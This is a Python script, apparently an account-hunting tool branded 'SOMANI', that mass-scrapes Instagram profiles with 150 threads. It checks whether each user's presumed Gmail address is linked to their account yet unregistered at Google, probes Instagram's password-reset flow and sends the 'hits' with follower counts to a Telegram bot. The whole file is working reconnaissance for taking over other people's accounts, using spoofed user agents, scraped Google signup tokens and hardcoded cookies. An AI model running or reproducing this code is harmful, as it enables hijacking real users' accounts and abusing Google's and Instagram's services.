import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import gzip
import secrets
from datetime import datetime
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from colorama import Fore, Style, init
import webbrowser

# Initialize colorama
init(autoreset=True)

# Global stats with thread safety
stats_lock = Lock()
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}
TOKEN_FILE = 'InstaTool_Token.txt'
instatool_domain = '@gmail.com'

# Color definitions
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
K = '\033[1;31m' 
Y = '\033[1;32m' 
S = '\033[1;33m' 
M = '\033[1;36m' 
E = '\x1b[1;32m'
import os
import pyfiglet
from colorama import Fore, Style, init

# init colorama
init(autoreset=True)

def snowy_text():
    text = "𝑺𝑶𝑴𝑨𝑵𝑰"
    banner = pyfiglet.figlet_format(text, font="slant")

    # get terminal width for centering
    try:
        width = os.get_terminal_size().columns
    except:
        width = 80

    for line in banner.splitlines():
        print(Fore.CYAN + line.center(width))

snowy_text()

# Constants
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
CONTENT_TYPE_HEADER = 'Content-Type'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
USER_AGENT_HEADER = 'User-Agent'

def safe_request(url, method='GET', **kwargs):
    """Safe request wrapper with retries and error handling"""
    session = requests.Session()
    session.headers.update({'Connection': 'close'})
    
    for attempt in range(3):
        try:
            if method.upper() == 'POST':
                resp = session.post(url, timeout=15, **kwargs)
            else:
                resp = session.get(url, timeout=15, **kwargs)
            resp.raise_for_status()
            return resp
        except Exception:
            time.sleep(0.5 * (attempt + 1))
            continue
    return None

def instatool():
    """SNOWY..."""
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(alphabet) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(alphabet) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(alphabet) for _ in range(random.randrange(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: generate_user_agent()
        }
        
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                       "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        
        res1 = safe_request(recovery_url, headers=headers)
        if not res1:
            return False
            
        tok_match = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        
        if not tok_match:
            return False
            
        tok = tok_match.group(2)
        cookies = {'__Host-GAPS': host}
        
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                             '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                          'null,0,1,"",null,null,2,2]')
        }
        
        response = safe_request(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                               method='POST', cookies=cookies, headers=headers2, data=data)
        
        if not response:
            return False
            
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS')
        
        if token_line and host:
            with open(TOKEN_FILE, 'w') as f:
                f.write(f"{token_line}//{host}\n")
            return True
        return False
        
    except Exception:
        return False

def check_instagram_email(mail):
    """Check if email exists on Instagram"""
    try:
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        headers = {
            'X-Csrftoken': secrets.token_hex(16),
            'User-Agent': generate_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/signup/email/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        
        data = {'email': mail}
        res = safe_request(url, method='POST', headers=headers, data=data)
        if res:
            return "email_is_taken" in res.text
        return False
    except Exception:
        return False

def check_gmail(email):
    """Check Gmail availability"""
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
            
        if not os.path.exists(TOKEN_FILE):
            return
            
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().strip()
            if not token_data:
                return
            tl, host = token_data.split('//')
        
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        
        response = safe_request(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                               method='POST', params=params, cookies=cookies, headers=headers, data=data)
        
        if response and '"gf.uar",1' in response.text:
            with stats_lock:
                hits += 1
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            with stats_lock:
                bad_email += 1
                
    except Exception:
        pass

def check(email):
    """Main check function"""
    global good_ig, bad_insta
    try:
        email_exists = check_instagram_email(email)
        
        if email_exists:
            if instatool_domain in email:
                check_gmail(email)
            with stats_lock:
                good_ig += 1
        else:
            with stats_lock:
                bad_insta += 1
                
        update_stats()
        
    except Exception:
        with stats_lock:
            bad_insta += 1
        update_stats()

def get_reset_info(fr):
    """Get Instagram password reset info"""
    try:
        url = "https://www.instagram.com/async/wbloks/fetch/"
        
        def ua():
            versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
            oss = [
                "Macintosh; Intel Mac OS X 10_15_7",
                "Macintosh; Intel Mac OS X 10_14_6",
                "iPhone; CPU iPhone OS 14_0 like Mac OS X",
                "iPhone; CPU iPhone OS 13_6 like Mac OS X"
            ]
            version = random.choice(versions)
            platform = random.choice(oss)
            return f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
        
        params = {
            'appid': "com.bloks.www.caa.ar.search.async",
            'type': "action",
            '__bkv': "cc4d2103131ee3bbc02c20a86f633b7fb7a031cbf515d12d81e0c8ae7af305dd"
        }
        
        payload = {
            '__d': "www",
            '__user': "0",
            '__a': "1",
            '__req': "9",
            '__hs': "20475.HYP:instagram_web_pkg.2.1...0",
            'dpr': "3",
            '__ccg': "GOOD",
            '__rev': "1032300900",
            '__s': "nrgu8k:vm015z:oanvx6",
            '__hsi': "7598106668658828571",
            '__dyn': "7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Qw5Mx62G3i1ywOwv89k2C1Fwc60D82Ixe0EUjwGzEaE2iwNwmE2eUlwhEe87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK1sAwHxW1owLwHwGwa6byohw5yweu",
            '__csr': "gLff3k5T92cDYAyT4Wkxh5bGhjehqjDVuhUCUya8u889hp8ydihrghXG9yGxGm2m9Gu59rxd0KAzy29oKbyUqxyfxOm7VEWfxDKiGgS4Uf98iJ0zGcKEqz89U5G4ry88bxqfzE9UeEGfw34U01oL8dHK0cvN00pOwywQV9o1uO00LYwcjw7Tgvg6Je1rwko2xDg19o68wgwGoaUiw7to66UjgmRw3MXw0yqw0sO8092U0myw",
            '__hsdp': "n0I43m1iQhGIiFckEKrBZvIj2SKUl8FeSE9Q08xyoC0x80sAw1TK0GU3xU1jE31w9y095waN04Uw",
            '__hblp': "0dO0Coco1ME884u9wcC2t0lUbo22wzx61mDw5Pw4OwsoboK0sm0FE620cizU5W0bAz8W0wEGuq08Owc60C80xu2S0H40jy1dwDzo2Ow61w",
            '__sjsp': "n0I43m1iQhGIiFckEKrBZvIRh4rHK5iaqSE0AG9yo",
            '__comet_req': "7",
            'lsd': "AdJv3Nfv2cg",
            'jazoest': "2958",
            '__spin_r': "1032300900",
            '__spin_b': "trunk",
            '__spin_t': "1769072066",
            '__crn': "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
            'params': "{\"params\":\"{\\\"server_params\\\":{\\\"event_request_id\\\":\\\"3a359125-0214-4c12-9516-8779938e6188\\\",\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"INTERNAL__latency_qpl_instance_id\\\":\\\"47361890900104\\\",\\\"device_id\\\":\\\"\\\",\\\"family_device_id\\\":null,\\\"waterfall_id\\\":\\\"69517426-942a-45d2-8ac7-e4f11a60412a\\\",\\\"offline_experiment_group\\\":null,\\\"layered_homepage_experiment_group\\\":null,\\\"is_platform_login\\\":0,\\\"is_from_logged_in_switcher\\\":0,\\\"is_from_logged_out\\\":0,\\\"access_flow_version\\\":\\\"pre_mt_behavior\\\",\\\"context_data\\\":\\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\\"},\\\"client_input_params\\\":{\\\"zero_balance_state\\\":null,\\\"search_query\\\":\\\"f{{fr}}\\\",\\\"fetched_email_list\\\":[],\\\"fetched_email_token_list\\\":{},\\\"sso_accounts_auth_data\\\":[],\\\"sfdid\\\":\\\"\\\",\\\"text_input_id\\\":\\\"7tzaot:101\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"was_headers_prefill_available\\\":0,\\\"was_headers_prefill_used\\\":0,\\\"ig_oauth_token\\\":[],\\\"android_build_type\\\":\\\"\\\",\\\"is_whatsapp_installed\\\":0,\\\"device_network_info\\\":null,\\\"accounts_list\\\":[],\\\"is_oauth_without_permission\\\":0,\\\"search_screen_type\\\":\\\"email_or_username\\\",\\\"ig_vetted_device_nonce\\\":\\\"\\\",\\\"gms_incoming_call_retriever_eligibility\\\":\\\"client_not_supported\\\",\\\"auth_secure_device_id\\\":\\\"\\\",\\\"network_bssid\\\":null,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\"},\\\"aac\\\":\\\"\\\"}}\"}"
        }
        
        headers = {
            'User-Agent': ua(),
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="8.0.0.0", "Chromium";v="144.0.7559.76", "Google Chrome";v="144.0.7559.76"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-model': '"23090RA98I"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-prefers-color-scheme': "light",
            'sec-ch-ua-platform-version': '"15.0.0"',
            'origin': "https://www.instagram.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.instagram.com/accounts/password/reset/",
            'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "ig_did=886A3671-95EB-4016-9618-6504E3C60331; mid=aV938wABAAGNLqQD0prSU56ivhek; csrftoken=3xQbJVCm8wRdlSXKaXxztd; datr=HXhfaRa1lVxxpoC1K89YyZiA; ig_nrcb=1; wd=406x766"
        }
        
        fff = payload["params"].replace("f{{fr}}", fr)
        payload["params"] = fff
        
        response = safe_request(url, method='POST', params=params, data=payload, headers=headers)
        
        if response and response.status_code == 200:
            return "Reset ✅"
        return "Reset unavailable"
        
    except Exception:
        return "Reset Error"

def InfoAcc(username, domain):
    """Send account info report"""
    global total_hits
    try:
        with stats_lock:
            total_hits += 1
            
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk', 'N/A')
        full_name = account_info.get('full_name', 'N/A')
        followers = account_info.get('follower_count', 0)
        following = account_info.get('following_count', 0)
        posts = account_info.get('media_count', 0)
        bio = account_info.get('biography', 'N/A')
        
        info_text = f"""
 ✞︎ 𝐬𝐨𝐦𝐚𝐧𝐢 𝐠𝐢𝐯𝐞 𝐲𝐨𝐮 𝐡𝐢𝐭

🎀  𝑯𝒊𝒕𝒔        : {total_hits}
  𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆    : @{username}
📮  𝑬𝒎𝒂𝒊𝒍       : {username}@{domain}

 𝑭𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔   : {followers}
🍡  𝑭𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈   : {following}
  𝑷𝒐𝒔𝒕𝒔       : {posts}

  𝑩𝒊𝒐         : {bio}
 𝑹𝒆𝒔𝒆𝒕 𝑺𝒕𝒂𝒕𝒖𝒔 : {get_reset_info(username)}

🔗 𝑷𝒓𝒐𝒇𝒊𝒍𝒆
👉 https://www.instagram.com/{username}/

 𝑑𝑒𝑣«  @somani_07x 
"""
        
        # Save to file
        with open('instahits.txt', 'a', encoding='utf-8') as f:
            f.write(info_text + "\n" + "="*50 + "\n")
        
        # Send to Telegram (if token provided)
        if 'TOKEN' in globals() and 'ID' in globals():
            try:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                            data={"chat_id": ID, "text": info_text, "parse_mode": "Markdown"})
            except:
                pass
                
    except Exception:
        pass

def update_stats():
    """Update and display stats"""
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
        with stats_lock:
            hits_count = hits
            good_ig_count = good_ig
            bad_insta_count = bad_insta
            
        print(f"""
\033[38;5;213m══════════════════════════════════════════════════════════════
\033[1;37m          𝑺𝑶𝑴𝑨𝑵𝑰 𝑷𝒀
\033[38;5;213m══════════════════════════════════════════════════════════════

   \033[38;5;117m Hits     :  \033[1;37m{hits_count}
   \033[38;5;183m💌  Bad Emails    :  \033[1;37m{good_ig_count}
   \033[38;5;210m   Missed Ones     :  \033[1;37m{bad_insta_count}

\033[38;5;213m══════════════════════════════════════════════════════════════
\033[38;5;159m   𝑺𝒐𝒎𝒂𝒏𝒊
\033[0m
""")
    except:
        pass

def instatoolpy():
    """Main Instagram data fetcher"""
    while True:
        try:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': random.randint(3713668786, 21254029834),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            
            response = safe_request('https://www.instagram.com/api/graphql', 
                                  method='POST', headers=headers, data=data)
            
            if response:
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                
                if username:
                    infoinsta[username] = account
                    emails = [username + instatool_domain]
                    for email in emails:
                        check(email)
                        
            time.sleep(0.1)  # Small delay to prevent rate limiting
            
        except Exception:
            time.sleep(0.5)
            continue

# Main execution
def main():
    print(f"""
\033[38;5;213m══════════════════════════════════════════════════════════════
\033[38;5;183m         𝑆𝑂𝑀𝐴𝑁𝐼 
\033[38;5;213m══════════════════════════════════════════════════════════════

        \033[1;37m 𝑆𝑂𝑀𝐴𝑁𝐼 : \033[1;32m @somani_07x
        \033[1;37m🎀  Version        : \033[1;35m 𝑉8
        \033[1;37m✨  Status         : \033[1;32m 𝐹𝑎𝑠𝑡 𝑎𝑛𝑑 𝑤𝑜𝑟𝑘𝑖𝑛𝑔

\033[38;5;213m══════════════════════════════════════════════════════════════
\033[0m""")
    
    global TOKEN, ID

    TOKEN = input(
        f' {M}({M}🎀{M}) {M}  𝑻𝒐𝒌𝒆𝒏  {M}💌 :   ' + S
    ).strip()

    print("\x1b[38;5;213m—" * 60)

    ID = input(
        f' {S}({S}🧸{S}) {S}  𝐼𝐷  {S}🍓 :   ' + M
    ).strip()

    print("\x1b[38;5;213m—" * 60)
    
    # Initialize token
    print(f"{Y}[+] {M}...")
    if not instatool():
        print(f"{K}[-] {M}𝑆𝑡𝑎𝑦 𝑠𝑜𝑓𝑡, 𝑠𝑡𝑎𝑦 𝑝𝑜𝑜𝑘𝑖𝑒 💗...")
        instatool()
    
    print(f"{Y}[+] {M}𝐻𝑢𝑛𝑡𝑠 𝑠𝑡𝑎𝑟𝑡...")
    
    # Start threads
    threads = []
    for _ in range(150):
        t = Thread(target=instatoolpy, daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.01)  # Stagger thread starts
    
    # Stats update thread
    def stats_thread():
        while True:
            update_stats()
            time.sleep(2)
    
    Thread(target=stats_thread, daemon=True).start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[+] {M}Stopping engine...")
        sys.exit(0)

if __name__ == "__main__":
    main()
#JO CHHED CHHAD KAREGA USKI MKC MEIN GHODA
